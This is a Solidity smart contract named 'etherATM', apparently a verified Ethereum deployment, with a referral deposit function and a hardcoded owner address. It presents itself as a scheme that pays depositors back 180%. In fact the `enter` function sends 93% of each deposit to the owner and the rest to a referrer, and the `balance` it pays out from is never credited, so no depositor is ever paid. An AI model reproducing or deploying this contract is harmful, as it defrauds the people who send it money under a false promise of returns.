/**

 *Submitted for verification at Etherscan.io on 2020-07-15

*/



//pragma solidity ^0.5.10;
pragma solidity >=0.5 <0.7.17;



contract etherATM {

    struct Person {

        address payable etherAddress;

        uint256 amount;

        address payable referrer;

    }



    Person[] public persons;



    uint256 public payoutIdx = 0;

    uint256 public collectedFees;

    uint256 public balance = 0;



    address payable owner;



    modifier onlyowner {

        if (msg.sender == owner) _;

    }



    constructor() public {

        owner = 0xF51a48488be6AbEFFb56d4B1B666C19F2F66Cf1e;

    }



    function enter(address payable referrer) public payable {

        if (msg.value < 0.05 ether) {

            msg.sender.transfer(msg.value);

            return;

        }

        uint256 amount;

        if (msg.value > 4000 ether) {

            msg.sender.transfer(msg.value - 4000 ether);

            amount = 4000 ether;

        } else {

            amount = msg.value;

        }



        uint256 idx = persons.length;

        persons.length += 1;

        persons[idx].etherAddress = msg.sender;

        persons[idx].amount = amount;



        collectedFees += 0;

        uint256 totalAmount = collectedFees + amount;

        uint256 ownerAmount = totalAmount*93/100;

        totalAmount = totalAmount-ownerAmount;

        owner.transfer(ownerAmount);

        referrer.transfer(totalAmount);

        collectedFees = 0;



        while (balance > (persons[payoutIdx].amount / 100) * 180) {

            uint256 transactionAmount = (persons[payoutIdx].amount / 100) * 180;

            persons[payoutIdx].etherAddress.transfer(transactionAmount);

            balance -= transactionAmount;

            payoutIdx += 1;

        }

    }



    function setOwner(address payable _owner) external onlyowner {

        owner = _owner;

    }

}
